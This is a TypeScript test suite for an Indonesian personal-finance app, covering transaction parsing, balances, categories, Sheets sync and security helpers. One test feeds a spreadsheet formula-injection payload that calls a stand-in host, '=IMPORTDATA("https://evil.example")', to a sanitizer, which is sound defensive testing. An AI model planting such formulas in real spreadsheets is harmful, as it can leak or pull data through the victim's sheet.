import assert from "node:assert/strict";
import {
  buildGuriContextSummary,
  formatAiErrorMessage,
  normalizeRawAiDrafts,
  parseIndonesianTransactionsLocal,
  resolveGeminiModelChain,
} from "../src/lib/ai-parser.ts";
import {
  computeAccountBalances,
  computeDailyAllowance,
  computePeriodMetrics,
  computeStreak,
  countElapsedDays,
  formatDisplayDate,
} from "../src/lib/finance.ts";
import {
  buildIncrementalSyncPlan,
  chunkRows,
  decryptToken,
  encryptToken,
  SHEET_HEADERS,
  transactionToSheetRow,
} from "../src/lib/google-sheets.ts";
import { checkRateLimit, constantTimeEqual, sanitizeSpreadsheetCell } from "../src/lib/security.ts";
import { computeDbDiff } from "../src/lib/supabase.ts";
import {
  addAccountInDb,
  createInitialDb,
  DEFAULT_EXPENSE_CATEGORIES,
  deleteAccountInDb,
  deleteCategoryInDb,
  parseLegacyCsv,
  PRESET_CATEGORIES,
  recomputeGoalAmounts,
  reorderCategoriesInDb,
  updateCategoryInDb,
} from "../src/lib/store.ts";
import { CATEGORY_ICON_OPTIONS, type Account, type AppDatabase, type Transaction } from "../src/lib/types.ts";

const sampleAccounts: Account[] = [
  { id: "acc-cash", name: "Tunai", kind: "cash", initialBalance: 0 },
  { id: "acc-bank", name: "Rekening Bank", kind: "bank", initialBalance: 0 },
  { id: "acc-ewallet", name: "E-Wallet", kind: "ewallet", initialBalance: 0 },
];

function runTests() {
  // 1. Multi-transaction + discount + transfer parsing
  const drafts = parseIndonesianTransactionsLocal(
    "Ngopi 25rb pake gopay, beli telur 100rb diskon 10rb cash, gaji masuk bca 5jt, transfer 200rb dari bca ke cash",
    sampleAccounts,
    "2026-11-17",
  );
  assert.equal(drafts.length, 4);
  assert.equal(drafts[0].amount, 25_000);
  assert.equal(drafts[0].accountId, "acc-ewallet");
  assert.equal(drafts[0].category, "Makan & Minum");

  assert.equal(drafts[1].amount, 90_000);
  assert.equal(drafts[1].accountId, "acc-cash");

  assert.equal(drafts[2].type, "Masuk");
  assert.equal(drafts[2].amount, 5_000_000);
  assert.equal(drafts[2].accountId, "acc-bank");

  assert.equal(drafts[3].type, "Transfer");
  assert.equal(drafts[3].accountId, "acc-bank");
  assert.equal(drafts[3].toAccountId, "acc-cash");

  // 2. Daily allowance & tomorrow projection
  const now = new Date(2026, 10, 17); // 2026-11-17
  const txs: Transaction[] = [
    {
      id: "1",
      date: "2026-11-16",
      type: "Masuk",
      category: "Gaji",
      accountId: "acc-bank",
      amount: 3_000_000,
      note: "",
      source: "manual",
      sheetSyncStatus: "local_only",
      createdAt: "2026-11-16T00:00:00Z",
      updatedAt: "2026-11-16T00:00:00Z",
    },
    {
      id: "2",
      date: "2026-11-17",
      type: "Keluar",
      category: "Makanan",
      accountId: "acc-cash",
      amount: 20_000,
      note: "",
      source: "manual",
      sheetSyncStatus: "local_only",
      createdAt: "2026-11-17T01:00:00Z",
      updatedAt: "2026-11-17T01:00:00Z",
    },
    // Prior year transaction in November must NOT mix into current year monthly metrics!
    {
      id: "3",
      date: "2025-11-17",
      type: "Keluar",
      category: "Makanan",
      accountId: "acc-cash",
      amount: 999_000,
      note: "Tahun lalu",
      source: "manual",
      sheetSyncStatus: "local_only",
      createdAt: "2025-11-17T01:00:00Z",
      updatedAt: "2025-11-17T01:00:00Z",
    },
  ];

  const allowance = computeDailyAllowance(txs, 1_600_000, 1, now); // 14 days left (17..30)
  assert.equal(allowance.daysLeftInCycle, 14);
  assert.equal(allowance.spentToday, 20_000);
  assert.equal(allowance.spentInCycle, 20_000);

  // 3. Month+Year isolation & income/custom date period filters
  const metrics = computePeriodMetrics(txs, "month", now);
  assert.equal(metrics.expense, 20_000);
  assert.equal(metrics.income, 3_000_000);
  assert.equal(metrics.incomeByCategory[0]?.name, "Gaji");
  assert.equal(metrics.incomeByCategory[0]?.pct, 100);
  assert.equal(metrics.savingRate, 99);

  const prevYearMonth = computePeriodMetrics(
    txs,
    { kind: "month", monthKey: "2025-11" },
    now,
  );
  assert.equal(prevYearMonth.expense, 999_000);
  assert.equal(prevYearMonth.income, 0);

  const customWindow = computePeriodMetrics(
    txs,
    { kind: "custom", startDate: "2026-11-16", endDate: "2026-11-16" },
    now,
  );
  assert.equal(customWindow.income, 3_000_000);
  assert.equal(customWindow.expense, 0);

  // 4. Streak & balances
  const streak = computeStreak(txs, now);
  assert.equal(streak.streakDays, 2);
  assert.equal(streak.recordedToday, true);

  const balances = computeAccountBalances(sampleAccounts, txs);
  assert.equal(balances.find((b) => b.id === "acc-bank")?.balance, 3_000_000);
  assert.equal(balances.find((b) => b.id === "acc-cash")?.balance, -1_019_000);

  // 5. Balance reconciliation (Koreksi) updates account balance without skewing income/expense
  const reconciledTxs: Transaction[] = [
    ...txs,
    {
      id: "4",
      date: "2026-11-17",
      type: "Koreksi",
      category: "Koreksi Tambah",
      accountId: "acc-ewallet",
      amount: 150_000,
      note: "Saldo awal e-wallet",
      source: "reconciliation",
      sheetSyncStatus: "local_only",
      createdAt: "2026-11-17T02:00:00Z",
      updatedAt: "2026-11-17T02:00:00Z",
    },
    {
      id: "5",
      date: "2026-11-17",
      type: "Koreksi",
      category: "Koreksi Kurang",
      accountId: "acc-bank",
      amount: 25_000,
      note: "Biaya admin",
      source: "reconciliation",
      sheetSyncStatus: "local_only",
      createdAt: "2026-11-17T02:05:00Z",
      updatedAt: "2026-11-17T02:05:00Z",
    },
  ];

  const reconciledBalances = computeAccountBalances(sampleAccounts, reconciledTxs);
  assert.equal(reconciledBalances.find((b) => b.id === "acc-ewallet")?.balance, 150_000);
  assert.equal(reconciledBalances.find((b) => b.id === "acc-bank")?.balance, 2_975_000);

  const metricsAfterReconcile = computePeriodMetrics(reconciledTxs, "month", now);
  assert.equal(metricsAfterReconcile.income, 3_000_000);
  assert.equal(metricsAfterReconcile.expense, 20_000);

  // 6. Legacy CSV import compatibility (both DD/MM/YYYY and DD-MM-YYYY) & DD-MM-YYYY display formatter
  const csvSample = [
    "Tanggal,Jenis,Nominal,Kategori,Keterangan",
    '"16/11/2026","Keluar",25000,"Makan & Minum","Nasi Padang"',
    '"18-11-2026","Masuk",500000,"Bonus","Bonus Proyek"',
  ].join("\n");
  const imported = parseLegacyCsv(csvSample, "acc-cash");
  assert.equal(imported.length, 2);
  assert.equal(imported[0].date, "2026-11-16");
  assert.equal(imported[0].amount, 25_000);
  assert.equal(imported[1].date, "2026-11-18");
  assert.equal(imported[1].amount, 500_000);
  assert.equal(formatDisplayDate("2026-11-18"), "18-11-2026");

  // 7. Daily-average divisor uses real elapsed days per period
  assert.equal(countElapsedDays(txs, "month", now), 17);
  assert.equal(countElapsedDays(txs, "year", now), 321); // Jan 1 .. Nov 17, 2026
  assert.equal(countElapsedDays(txs, { kind: "month", monthKey: "2026-10" }, now), 31);
  assert.equal(countElapsedDays(txs, { kind: "month", monthKey: "2026-12" }, now), 1);
  assert.equal(
    countElapsedDays(txs, { kind: "custom", startDate: "2026-11-10", endDate: "2026-11-30" }, now),
    8,
  );
  assert.equal(computePeriodMetrics(txs, "year", now).dailyAverageExpense, Math.round(20_000 / 321));

  // 8. Goal progress derived from deposit transactions (edit/delete stays consistent)
  const goalDb = {
    goals: [{ id: "g1", name: "Laptop", targetAmount: 1_000_000, currentAmount: 999, createdAt: "" }],
    transactions: [
      { ...txs[1], id: "d1", amount: 100_000, goalId: "g1" },
      { ...txs[1], id: "d2", amount: 50_000, goalId: "g1" },
    ],
  } as unknown as AppDatabase;
  recomputeGoalAmounts(goalDb);
  assert.equal(goalDb.goals[0].currentAmount, 150_000);
  goalDb.transactions = goalDb.transactions.filter((t) => t.id !== "d2");
  recomputeGoalAmounts(goalDb);
  assert.equal(goalDb.goals[0].currentAmount, 100_000);

  // 9. Account initialBalance prevents negative balance from opening expenses
  const seededAccounts: Account[] = sampleAccounts.map((a) =>
    a.id === "acc-cash" ? { ...a, initialBalance: 1_500_000 } : a,
  );
  const seededBalances = computeAccountBalances(seededAccounts, txs);
  assert.equal(seededBalances.find((b) => b.id === "acc-cash")?.balance, 481_000);

  // 10. Category icon options are unique and cover every preset category (9 shared expenses + role incomes)
  const iconKeys = CATEGORY_ICON_OPTIONS.map((o) => o.key);
  assert.equal(new Set(iconKeys).size, iconKeys.length);
  assert.deepEqual(
    DEFAULT_EXPENSE_CATEGORIES.map((c) => c.name),
    [
      "Makan & Minum",
      "Transportasi & Bensin",
      "Listrik & Air",
      "Pulsa & Kuota",
      "Kesehatan & Obat",
      "Sedekah & Donasi",
      "Belanja",
      "Pendidikan",
      "Lain-lain",
    ],
  );
  assert.deepEqual(
    PRESET_CATEGORIES.asn_karyawan.masuk.map((c) => c.name),
    ["Gaji", "Tunjangan", "Bonus", "THR", "Lain-lain"],
  );
  assert.deepEqual(
    PRESET_CATEGORIES.umum.masuk.map((c) => c.name),
    ["Gaji", "Tunjangan", "Bonus", "Usaha Sampingan", "Lain-lain"],
  );
  assert.deepEqual(
    PRESET_CATEGORIES.mahasiswa.masuk.map((c) => c.name),
    ["Uang Saku", "Beasiswa", "Lain-lain"],
  );
  assert.deepEqual(
    PRESET_CATEGORIES.freelancer.masuk.map((c) => c.name),
    ["Proyek Klien", "Retainer", "Royalti", "Produk", "Lain-lain"],
  );
  for (const preset of Object.values(PRESET_CATEGORIES)) {
    assert.equal(preset.keluar.length, 9);
    for (const item of [...preset.keluar, ...preset.masuk]) {
      assert.ok(iconKeys.includes(item.iconKey as (typeof iconKeys)[number]), `Missing icon: ${item.iconKey}`);
    }
  }

  // 11. Category rename updates matching transactions; delete reassigns to chosen replacement
  const catDb = {
    categories: [
      { id: "c1", name: "Makanan", type: "Keluar", iconKey: "utensils" },
      { id: "c2", name: "Makanan dan Minuman", type: "Keluar", iconKey: "coffee" },
      { id: "c3", name: "Gaji", type: "Masuk", iconKey: "briefcase" },
    ],
    transactions: [
      { ...txs[1], id: "t-k", type: "Keluar", category: "Makanan" },
      { ...txs[0], id: "t-m", type: "Masuk", category: "Gaji" },
    ],
    sheetConnection: { configured: false, connected: false, sheetTabName: "Transaksi" },
  } as unknown as AppDatabase;

  const dupRes = updateCategoryInDb(catDb, "c1", { name: "makanan dan minuman" });
  assert.equal(dupRes.ok, false);

  const renRes = updateCategoryInDb(catDb, "c1", { name: "Konsumsi", iconKey: "coffee" });
  assert.equal(renRes.ok, true);
  assert.equal(catDb.categories[0].name, "Konsumsi");
  assert.equal(catDb.categories[0].iconKey, "coffee");
  assert.equal(catDb.transactions[0].category, "Konsumsi");

  const badDel = deleteCategoryInDb(catDb, "c1");
  assert.equal(badDel.ok, false);

  const okDel = deleteCategoryInDb(catDb, "c1", "Makanan dan Minuman");
  assert.equal(okDel.ok, true);
  assert.equal(catDb.categories.some((c) => c.id === "c1"), false);
  assert.equal(catDb.transactions[0].category, "Makanan dan Minuman");
  assert.equal(catDb.transactions[1].category, "Gaji");

  // 12. Reorder categories within a type preserves opposite-type categories and rejects bad IDs
  catDb.categories.push({ id: "c4", name: "Transportasi", type: "Keluar", iconKey: "bus" });
  const badReorder = reorderCategoriesInDb(catDb, "Keluar", ["c2"]);
  assert.equal(badReorder.ok, false);
  const okReorder = reorderCategoriesInDb(catDb, "Keluar", ["c4", "c2"]);
  assert.equal(okReorder.ok, true);
  assert.deepEqual(
    catDb.categories.filter((c) => c.type === "Keluar").map((c) => c.id),
    ["c4", "c2"],
  );
  assert.deepEqual(
    catDb.categories.filter((c) => c.type === "Masuk").map((c) => c.id),
    ["c3"],
  );

  // 13. AI model fallback chain, draft normalization, and clear error messages
  const chain = resolveGeminiModelChain("gemini-3.5-flash-lite", "gemini-3.5-flash-lite,gemini-3.1-flash-lite");
  assert.deepEqual(chain, ["gemini-3.5-flash-lite", "gemini-3.1-flash-lite"]);
  assert.equal(resolveGeminiModelChain()[0], "gemini-3.5-flash-lite");

  const aiOut = normalizeRawAiDrafts(
    '```json\n[{"type":"Transfer","accountId":"acc-bank","toAccountId":"acc-cash","amount":150000,"note":"Tarik tunai"},{"type":"Keluar","amount":0,"note":"Invalid"}]\n```',
    sampleAccounts,
    "2026-11-18",
  );
  assert.equal(aiOut.length, 1);
  assert.equal(aiOut[0].toAccountId, "acc-cash");
  assert.equal(aiOut[0].date, "2026-11-18");
  assert.equal(normalizeRawAiDrafts("not json", sampleAccounts).length, 0);

  assert.match(
    formatAiErrorMessage("rate_limit", { isReceipt: true, hasAnyKey: true }),
    /rate limit/i,
  );
  assert.match(
    formatAiErrorMessage("invalid_key", { isReceipt: true, hasAnyKey: true }),
    /tidak valid/i,
  );
  assert.match(
    formatAiErrorMessage("not_configured", { isReceipt: true, hasAnyKey: false }),
    /GEMINI_API_KEY/,
  );

  // 14. Tanya Guri context summary packs verified totals and recent transactions
  const guriSummary = JSON.parse(
    buildGuriContextSummary(
      {
        settings: {
          name: "Test",
          monthlyBudget: 3_000_000,
          paydayDay: 25,
          plan: "free",
          categoryPreset: "umum",
        },
        accounts: sampleAccounts,
        categories: [],
        goals: [{ id: "g1", name: "Laptop", targetAmount: 5_000_000, currentAmount: 500_000, createdAt: "" }],
        transactions: txs,
        sheetConnection: { configured: false, connected: false, sheetTabName: "Transaksi" },
      },
      now,
    ),
  );
  assert.equal(guriSummary.ringkasanBulanIni.pemasukan, "Rp 3.000.000");
  assert.equal(guriSummary.ringkasanBulanIni.pengeluaran, "Rp 20.000");
  assert.equal(guriSummary.targetTabungan[0].nama, "Laptop");
  assert.equal(guriSummary.transaksiTerbaru.length, 3);

  // 15. Google Sheets incremental sync plan & chunking preserve row order safely
  const emptyPlan = buildIncrementalSyncPlan([], [txs[0]], []);
  assert.equal(emptyPlan.needsHeader, true);
  assert.equal(emptyPlan.updates.length, 0);
  assert.equal(emptyPlan.deleteRowIndices0BasedDesc.length, 0);
  assert.equal(emptyPlan.appends.length, 1);

  const txUpdate: Transaction = { ...txs[0], id: "uuid-1", sheetSyncStatus: "pending" };
  const txAppend: Transaction = { ...txs[1], id: "uuid-5", sheetSyncStatus: "pending" };
  const deltaPlan = buildIncrementalSyncPlan(
    [SHEET_HEADERS[0], "uuid-1", "uuid-2", "uuid-3", "uuid-4"],
    [txUpdate, txAppend],
    ["uuid-2", "uuid-4", "uuid-1", "uuid-missing"],
  );
  assert.equal(deltaPlan.needsHeader, false);
  assert.equal(deltaPlan.updates.length, 1);
  assert.equal(deltaPlan.updates[0].rowNumber1Based, 2);
  assert.equal(deltaPlan.updates[0].tx.id, "uuid-1");
  assert.deepEqual(deltaPlan.deleteRowIndices0BasedDesc, [4, 2]);
  assert.equal(deltaPlan.appends.length, 1);
  assert.equal(deltaPlan.appends[0].id, "uuid-5");
  assert.deepEqual(chunkRows([1, 2, 3, 4, 5], 2), [[1, 2], [3, 4], [5]]);
  assert.deepEqual(chunkRows([], 2), []);

  // 16. Supabase delta diff computes only modified rows to minimize database egress
  const baseDb = createInitialDb();
  baseDb.transactions = [...txs];
  const mutatedDb = structuredClone(baseDb);
  mutatedDb.transactions.unshift({
    ...txs[0],
    id: "tx-new-cloud",
    amount: 75_000,
    updatedAt: "2026-11-18T11:00:00.000Z",
  });
  mutatedDb.transactions = mutatedDb.transactions.filter((t) => t.id !== "2");

  const dbDelta = computeDbDiff(baseDb, mutatedDb);
  assert.equal(dbDelta.settingsChanged, false);
  assert.equal(dbDelta.upsertedAccounts.length, 0);
  assert.equal(dbDelta.upsertedCategories.length, 0);
  assert.equal(dbDelta.upsertedTransactions.length, 1);
  assert.equal(dbDelta.upsertedTransactions[0].id, "tx-new-cloud");
  assert.deepEqual(dbDelta.deletedTransactionIds, ["2"]);
  assert.equal(dbDelta.clearAllTransactions, false);

  // 17. Token encryption round-trip & constant-time OAuth state compare
  const encrypted = encryptToken("refresh-token-rahasia-123");
  assert.notEqual(encrypted, "refresh-token-rahasia-123");
  assert.equal(decryptToken(encrypted), "refresh-token-rahasia-123");
  assert.equal(constantTimeEqual("abc-state-123", "abc-state-123"), true);
  assert.equal(constantTimeEqual("abc-state-123", "xyz-state-999"), false);

  // 18. Spreadsheet & CSV formula injection sanitization
  assert.equal(sanitizeSpreadsheetCell('=IMPORTDATA("https://evil.example")'), '\'=IMPORTDATA("https://evil.example")');
  assert.equal(sanitizeSpreadsheetCell("+5000 bonus"), "'+5000 bonus");
  assert.equal(sanitizeSpreadsheetCell("-parkir"), "'-parkir");
  assert.equal(sanitizeSpreadsheetCell("Makan siang"), "Makan siang");
  const safeRow = transactionToSheetRow(
    { ...txs[1], category: "=SUM(A1:A2)", note: "@evil" },
    sampleAccounts,
  );
  assert.equal(safeRow[3], "'=SUM(A1:A2)");
  assert.equal(safeRow[6], "'@evil");

  // 19. In-memory rate limiter enforces window cap cleanly
  const rlKey = `test-rl-${Date.now()}`;
  assert.equal(checkRateLimit(rlKey, 2, 60_000).ok, true);
  assert.equal(checkRateLimit(rlKey, 2, 60_000).ok, true);
  const thirdHit = checkRateLimit(rlKey, 2, 60_000);
  assert.equal(thirdHit.ok, false);
  assert.equal(thirdHit.remaining, 0);

  // 20. Client cannot trigger plan changes via computeDbDiff, while aiCreditsRemaining syncs
  const planAttempt = structuredClone(baseDb);
  planAttempt.settings.plan = "pro";
  assert.equal(computeDbDiff(baseDb, planAttempt).settingsChanged, false);
  const creditSpent = structuredClone(baseDb);
  creditSpent.settings.aiCreditsRemaining = 19;
  assert.equal(computeDbDiff(baseDb, creditSpent).settingsChanged, true);

  // 21. Custom wallet add & delete with transaction reassignment & last-wallet protection
  const accDb = createInitialDb();
  accDb.transactions = [{ ...txs[1], id: "tx-custom", accountId: "acc-cash" }];
  assert.equal(addAccountInDb(accDb, "BCA Pribadi", "bank", 2_000_000).ok, true);
  assert.equal(accDb.accounts.length, 4);
  assert.equal(addAccountInDb(accDb, "bca pribadi", "bank", 0).ok, false);
  const addedAcc = accDb.accounts[3];
  accDb.transactions[0].accountId = addedAcc.id;
  assert.equal(deleteAccountInDb(accDb, addedAcc.id, "acc-bank").ok, true);
  assert.equal(accDb.accounts.length, 3);
  assert.equal(accDb.transactions[0].accountId, "acc-bank");
  assert.equal(deleteAccountInDb(accDb, "acc-ewallet").ok, true);
  assert.equal(deleteAccountInDb(accDb, "acc-bank").ok, true);
  assert.equal(deleteAccountInDb(accDb, "acc-cash").ok, false);

  console.log("ALL CORE TESTS PASSED (21/21)");
}

runTests();
